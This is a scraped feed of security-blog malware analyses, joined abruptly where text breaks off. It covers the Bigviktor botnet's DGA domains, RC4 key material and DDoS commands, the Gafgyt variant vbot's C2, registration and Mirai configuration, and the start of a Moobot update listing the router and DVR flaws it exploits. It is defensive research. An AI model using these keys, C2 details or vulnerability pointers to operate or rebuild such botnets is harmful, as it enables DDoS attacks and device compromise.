00:00\nsha256\t----&#62;6ac0f83915ed5d7b9bb7055723084df001b16a552d758de3c415f083f931ab8c\nget first 4 bytes\t----&#62; key=0x6ac0f839\n\n</code></pre>\n<p>Therefore, the DGA doamin is different every month. Taking the July key (0x6ac0f839) as an example, the first 5 domains generated</p>\n<pre><code>c2url: decidefresh-county.in\nc2url: payculturaltour.org\nc2url: standvisiblereach.rocks\nc2url: meanforwardcap.top\nc2url: raisefitsize.rocks\n</code></pre>\n<p>When we observe the actual DNS data in packet, we can see the result matches.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_first5.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_first5.png\" class=\"kg-image\"></a><br>\nSee the end of the article for all DGA domains in July.</p>\n<h4 id=\"2getthecurrenteffectivec2\">2: Get the current effective C2</h4>\n<p>To connect to a vaild C2, Bigviktor start from a random position of the 1000 DGA domains. If there is no valid C2, it goes back to the first domain name and start over again.<br>\nIn order to ensure that the network is completely controllable and not stolen by others, Bigviktor will verify the signature of the s.jpeg file. Only after passing the signature verification, a C2 is deemed valid.</p>\n<p><a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_sjpeg.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_sjpeg.png\" class=\"kg-image\"></a></p>\n<p>The real payload encryption is hidden in the jpeg (<code>s.jpeg;image.jpeg</code>)file. The structure of jpeg is <code>IMAGE DATA(16 BYTES): Half-RC4 KEY(16 BYTES): Ciphertext</code>. Each <code>sample</code> integrates a Half-RC4 KEY(16 BYTES),each <code>payload</code> integrates a Half-RC4 KEY(16 BYTES), two Half-RC4 keys are spelled into a complete RC4 key(32 BYTES); also a hard-coded <code>ECDSA256 public key</code> is used to verify the decrypted payload.</p>\n<pre><code>  Half-RC4 KEY:\n  82 BC 09 D5 47 A9 37 27 8F ED F1 7B 29 2A FA 67\n  Pub KEY:\n  03 2F 37 51 43 1F A3 58 81 66 86 F7 BA 4C A2 30 \n  45 2C 9B 9E 12 9A E9 97 CF 69 09 CF 7F 42 D4 97 88 \n</code></pre>\n<p>Take s.jpeg(md5:4c6d0bed21bc226dbaf4e6adc7402563) as an example<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_de.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_de.png\" class=\"kg-image\"></a></p>\n<p>Splice out the complete RC4 key</p>\n<pre><code>  Half RC4 KEY from s.jpeg + Half Rc4 from sample\n  ------------------------------------------------------\n  46 00 B2 65 B0 3F 97 7F CF CB 65 31 1F D2 B3 A0\n  82 BC 09 D5 47 A9 37 27 8F ED F1 7B 29 2A FA 67\n</code></pre>\n<p>Decrypt Ciphertext to get<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/07/bigvitor_deres.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigvitor_deres.png\" class=\"kg-image\"></a><br>\nWhen the verification is successful, a valid C2 is obtained.The procedures of verification need to meet these condition</p>\n<ul>\n<li>signature verification</li>\n<li>Plaintext[2] ==\\x00,Plaintext[3] ==\\x09</li>\n<li>C2 in the plaintext is same as the Dga domain which responds to the s.jpeg request.</li>\n</ul>\n<h4 id=\"3askforspecifictasksfromc2\">3:Ask for specific tasks from C2</h4>\n<p>After the Bot obtains a valid C2, it will request the image.jpeg resource from C2<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_task.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_task.png\" class=\"kg-image\"></a><br>\nSimilarly, image.jpeg also needs to be decrypted and verified. After successful verification, the Bot will perform the corresponding DDos attack or update according to the instructions of image.jpeg.</p>\n<p>Bigviktor supports a total of 8 operations,</p>\n<table>\n<thead>\n<tr>\n<th>cmd</th>\n<th>cmd　description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1</td>\n<td>null</td>\n</tr>\n<tr>\n<td>2</td>\n<td>connect attack</td>\n</tr>\n<tr>\n<td>3</td>\n<td>tcp syn attack with fixed source ip</td>\n</tr>\n<tr>\n<td>4</td>\n<td>tcp syn attack with random source ip</td>\n</tr>\n<tr>\n<td>6</td>\n<td>update</td>\n</tr>\n<tr>\n<td>7</td>\n<td>tcp syn attack with random sourceip from male.jpeg</td>\n</tr>\n<tr>\n<td>8</td>\n<td>tcp syn attack with random sourceip from male.jpeg</td>\n</tr>\n<tr>\n<td>9</td>\n<td>null</td>\n</tr>\n</tbody>\n</table>\n<p>Take a payload from June,image.jpeg(md5:<code>2e8c223f8ac1f331c36acd32ee949f6f</code>) as an example<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_raw.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_raw.png\" class=\"kg-image\"></a><br>\nDecrypt Ciphertext to get<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_attack.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_attack.png\" class=\"kg-image\"></a><br>\nWe can see that bot will launch &#34;connect&#34; ddos attack and the target is 202.162.108.55:80. The result matches the pcap info.<br>\n<a href=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_pcap.png\"><img src=\"https://blog.netlab.360.com/content/images/2020/07/bigviktor_pcap.png\" class=\"kg-image\"></a></p>\n<h2 id=\"contactus\">Contact us</h2>\n<p>Readers are always welcomed to reach us on <a 08:23:21","updatedTime":"2020-08-25 08:23:21","title":"The Gafgyt variant vbot seen in its 31 campaigns","link":"https://blog.netlab.360.com/the-gafgyt-variant-vbot-and-its-31-campaigns/","description":"<h2 id=\"overview\">Overview</h2>\n<p>Gafgyt botnets have a long history of infecting Linux devices to launch DDoS attacks. While dozens of variants have been detected, new variants are constantly emerging with changes in terms of register message, exploits, and attacking methods. On the other hand, their new botnets are usually short lived, with most of the C2s watched keeping active for only a few days. In this blog, I will introduce such a sort of variant. The key findings are as follow:</p>\n<ol>\n<li>This variant was active from mid-April to mid-June. In total 31 campaigns for this variant were detected, from which 572 samples were captured. They were spread to build 19 botnets.</li>\n<li>This variant evolved through 2 versions. Both have a characteristic register message template “ver:%f:%s:%d” that includes a rarely seen format specifier “%f”.</li>\n<li>Mirai code was heavily used in both versions, which makes it possible analyze them with the extracted Mirai configurations.</li>\n<li>The same infrastructures, e.g., download servers, and filenames were observed being used in other families of botnet campaigns.<br>\nThis variant was named as vbot because vbot is found being used in an unstripped sample by the author. Accordingly the 2 versions are named as vbot1 and vbot2 in this blog.</li>\n</ol>\n<h2 id=\"vbot1\">vbot1</h2>\n<p>Only 1 vbot1 campaign was seen, with 26 samples captured, as shown by the following honeypot records.</p>\n<p><img src=\"https://blog.netlab.360.com/content/images/2020/07/fig1.png\" alt=\"fig1\"></p>\n<p>All samples share the same C2 <code>185.225.19.200:2017</code>. Since in Gafgyt it’s common that the same source code will be compiled into binaries for different processor architectures, for simplicity, the following analysis is based on the unstripped ARM sample of <code>f696375452d08eecbde14d64c74acdde</code>. Compared with previous variants, vbot1 has a more concise main() function because most of its code was moved into 2 new functions named init_vbot() and main_c2_handler().<br>\n<img src=\"https://blog.netlab.360.com/content/images/2020/07/fig3.png\" alt=\"fig3\"><br>\nThe function name init_vbot indicates that the author code named their botnet as vbot. It's responsible for initializing things including watchdog, configurations, and scanner. C2 communications are done in main_c2_handler(), where a loop of connection, registration and receiving command can be found, as shown below.</p>\n<p><img src=\"https://blog.netlab.360.com/content/images/2020/07/fig4.png\" alt=\"fig4\"></p>\n<p>The characteristic register message template <code>“ver:%f:%s:%d”</code> is used in the registration block that tightly follows the connection block. From the unstripped symbols we can show that the 3 specifiers separately represent version, bot type and arch. The analyzed sample has version of 4.1.<br>\nActually it’s just the rarely seen specifier <code>“%f”</code> that caused my attention to this variant because as far as I knew “%f” was not supported by Gafgyt. The original authors borrowed the design of C library functions <code>printf</code> and <code>sprintf</code>, and implemented a new function named <code>sockprintf</code> which can generate message according to the assigned string format and send it to the C2. A custom yet simple format controls is done inside sockprintf with “%f” not implemented. That function has been kept by most Gafgyt variants. When firstly encountering vbot’s register template, I imagined a new version of sockprintf. However, that’s obviously not true. To reuse sockprintf but avoid complex programming, vbot author turned to sprintf to generate the expected message then passed it to sockprintf with the supported specifier <code>“%s”</code>.<br>\nSimilar to many Gafgyt variants, Mirai code can be found in vbot1. Due to its tight connection with the encrypted configurations, the borrowed code can be well analyzed with the extracted configurations. If you don’t know how to extract, please go to our VB2018 <a href=\"https://www.virusbulletin.com/uploads/pdf/magazine/2018/VB2018-Liu-Wang.pdf\">paper</a>. The extracted configurations are shown below, with items annotated with its owner modules.<br>\n<img src=\"https://blog.netlab.360.com/content/images/2020/07/fig5.png\" alt=\"fig5\"><br>\nThe commands are hidden in configurations. Except for attacking methods, vbot1 also supports remote update with the command <code>UPDATE</code>. Another worth mentioning feature is persistence mechanism, which is done by modifying crontab.</p>\n<p>It’s strange that vbot1 was spread only once. After its campaign was firstly detected, 35 hours, or 1.5 days, later the first vbot2 campaign was seen from the same download server. Obviously the operators wanted to replace vbot1 with vbot2. The reason might be its buggy registration which always sends a 191-byte register message back to its C2 but only 18 bytes there are really useful, as shown by the following figure.</p>\n<p><img src=\"https://blog.netlab.360.com/content/images/2020/07/fig2.png\" alt=\"fig2\"></p>\n<h2 id=\"vbot2\">vbot2</h2>\n<p>In total 30 vbot2 campaigns were seen from April 16 to June 12, 2020, with 546 samples captured from 12 download servers. From those samples 13 C2 servers were checked. Detailed analysis shows except the registration code, vbot2 actually differs a lot from vbot1 in terms of code structure, attacking methods and Mirai configuration. The following analysis is based on the x86 sample <code>f5b0ebebc924e69e34a4ddd145916594</code>. It’s stripped but key function names have been manually restored.<br>\nDifferent from vbot1 but similar to many other variants, vbot2's C2 communications are done in main(), as shown below.</p>\n<p><img src=\"https://blog.netlab.360.com/content/images/2020/07/fig6.png\" alt=\"fig6\"></p>\n<p>Nearly the same registration block as vbot1 can be found, with the 3 specifiers holding the same semantics. The analyzed sample has version of 1.5. The loop composed of “loc_804B80B -&#62; REGISTRATION -&#62; loc_804B863” is very similar to previous Gafgyt variants in terms of CFG node number and semantics. The blocks are separately responsible for establishing connection, registration, and receiving commands.<br>\n5 attacking methods were checked. All of them have been seen in other variants.</p>\n<p><img src=\"https://blog.netlab.360.com/content/images/2020/07/fig7.png\" alt=\"fig7\"></p>\n<p>Some vbot2 samples, e.g., <code>e36d96a74236038a348cfd667ca83528</code>, have slightly different attacking method names, as shown below.</p>\n<p><img src=\"https://blog.netlab.360.com/content/images/2020/07/fig8.png\" alt=\"fig8\"></p>\n<p>2 Mirai configurations were found. The only difference lies in the 0x28 item, as shown by the following 2 figures.</p>\n<p><img src=\"https://blog.netlab.360.com/content/images/2020/07/fig9-1.png\" alt=\"fig9-1\"><br>\n<img src=\"https://blog.netlab.360.com/content/images/2020/07/fig10.png\" alt=\"fig10\"></p>\n<p>From the annotations we can see the Mirai code was mainly used in modules of watchdog, killer, scanner and rand alpha string generation. Since the 0x28 item corresponds to a message to be written to the STDOUT, and the second unprintable 0x28 item is probably caused by a typo from the author.<br>\nWith the extracted configurations the differences from vbot1 are obvious. They are:</p>\n<ol>\n<li>vbot2 has different attacking methods from vbot1.</li>\n<li>While vbot1 hides commands in its configuration, vbot2 directly uses them.</li>\n<li>No remote update and persistence mechanism were found in vbot2.</li>\n</ol>\n<p>Although those great differences suggest that vbot1 and vbot2 were actually derived from different code bases, I still think they were written by the same author(s) because:</p>\n<ol>\n<li>The shared register message template and registration implementation are unique enough.</li>\n<li>The first vbot2 campaign shared the same download and C2 server as vbot1 within a relatively short period of time (1.5 days).</li>\n</ol>\n<h2 id=\"vbotandtherhombusmalware\">vbot and the RHOMBUS malware</h2>\n<p>While the filename RHOMBUS was seen 4 times in vbot campaigns, its use in Gafgyt campaigns was much earlier<a href=\"https://twitter.com/_odisseus/status/1232957932121313281\">[1]</a>, with the variant called RHOMBUS analysed in <a href=\"https://old.reddit.com/r/LinuxMalware/comments/fh3zar/memo_rhombus_an_elf_bot_installerdropper/\">[2]</a><a href=\"https://blog.apnic.net/2020/05/22/rhombus-a-new-iot-malware/\">[3]</a>. Here I make a simple comparison. In the blogged RHOMBUS malware dropper mechanism was found, with the dropper having the persistence ability across restart by modifying crontab. The dropped binaries, e.g., <code>269029c1554b13c3eccfaacf0196ff72</code> and <code>ba42665872ea41e3d2edd8978bc38c24</code>, actually belong to another Gafgyt variant that also heavily borrowed code from Mirai, as shown by the below figure.<br>\n<img src=\"https://blog.netlab.360.com/content/images/2020/07/fig11.png\" alt=\"fig11\"><br>\nFrom the above configuration we can see that obvious similarities exist between the RHOMBUS dropped binaries and vbot1. I think the most possibility is that vbot1 evolved from RHOMBUS malware with the following modifications:</p>\n<ol>\n<li>The dropper’s persistence mechanism was grafted to its payload. That’s why persistence items could be found in vbot1 configuration but not in the above figure.</li>\n<li>The register template was updated.</li>\n<li>c2 communications were moved to the so called main_c2_handler() function.</li>\n</ol>\n<p>Other key points about RHOMBUS malware include:</p>\n<ol>\n<li>The register message template is &#34;jm:_:%d&#34; or jm:%s:%d.</li>\n<li>Similar to many Gafgyt variants, C2 communications were done in main().</li>\n<li>The Gafgyt characteristic function initConnection() was removed with its code broken down into snippets that can be found in main().</li>\n</ol>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>I have introduced a short lived Gafgyt variant vbot. During its 2 month life, 31 campaigns were seen to build 19 botnets. From vbot we can learn that it’s easy for Linux IoT botnet authors to quickly write new variants, which might be due to the fact that dozens of Gafgyt and Mirai source has been leaked online. Once a new variant is written, the behind operators usually will spread it over and over with different campaigns to build multiple botnets. Such patterns have also been observed in other variants and families, e.g., Mirai. To fight such sort of fast emerging while short living botnets, automatic IoC extraction would play an import role for quick blocking or tracking. In VB2020 conference to be held in October, I will give a <a href=\"https://www.virusbulletin.com/conference/vb2020/abstracts/lightweight-emulation-based-ioc-extraction-gafgyt-botnets\">talk</a> on that topic. I hope it will help you fight against Gafgyt botnets better.</p>\n<h2 id=\"ioc\">IoC</h2>\n<h3 id=\"downloadservers\">download 08:23:21","updatedTime":"2020-08-25 08:23:21","title":"An Update for a Very Active DDos Botnet: Moobot","link":"https://blog.netlab.360.com/ddos-botnet-moobot-en/","description":"<h1 id=\"overview\">Overview</h1>\n<p>Moobot is a Mirai based botnet. We first discovered its activity in July 2019. Here is our log about it<a href=\"https://blog.netlab.360.com/the-botnet-cluster-on-185-244-25-0-24-en/\">[0]</a>. And ever since then, its sample updates, DDoS attacks and other activities have never stopped.Recently we saw it participated in some very high profile DDoS attacks, we got asked quite a few times in the security community regarding to what botnet is behind the attacks, so here is some more details.</p>\n<h1 id=\"sampledissemination\">Sample dissemination</h1>\n<p>Moobot samples are mainly spread through weak telnet passwords and some nday and 0day <a href=\"https://blog.netlab.360.com/multiple-fiber-routers-are-being-compromised-by-botnets-using-0-day/\">[1]</a><a href=\"https://blog.netlab.360.com/multiple-botnets-are-spreading-using-lilin-dvr-0-day-en/\">[2]</a>vulnerabilities. The vulnerabilities we observed using Moobot are as follows:</p>\n<table>\n<thead>\n<tr>\n<th>Vulnerability</th>\n<th>Affected Aevice</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><a href=\"https://habr.com/en/post/486856/\">HiSilicon DVR/NVR Backdoor</a></td>\n<td>Firmware for Xiaongmai-based DVRs, NVRs and IP cameras</td>\n</tr>\n<tr>\n<td><a href=\"https://www.exploit-db.com/exploits/48268\">CVE-2020-8515</a></td>\n<td>DrayTek Vigor router</td>\n</tr>\n<tr>\n<td><a href=\"https://www.exploit-db.com/exploits/41471/\">JAWS Webserver unauthenticated shell command execution</a></td>\n<td>MVPower DVR</td>\n</tr>\n<tr>\n<td><a href=\"https://www.meritlilin.com/assets/uploads/support/file/M00158-TW.pdf\">LILIN DVR</a></td>\n<td>LILIN DVRs</td>\n</tr>\n<tr>\n<td><a href=\"https://www.exploit-db.com/exploits/48225\">GPON Router RCE</a></td>\n<td>Netlink GPON Router 1.0.11</td>\n</tr>\n<tr>\n<td><a href=\"https://github.com/mcw0/PoC/blob/master/TVT-PoC.py\">TVT OEM API RCE</a></td>\n<td>TVT Digital Technology Co.
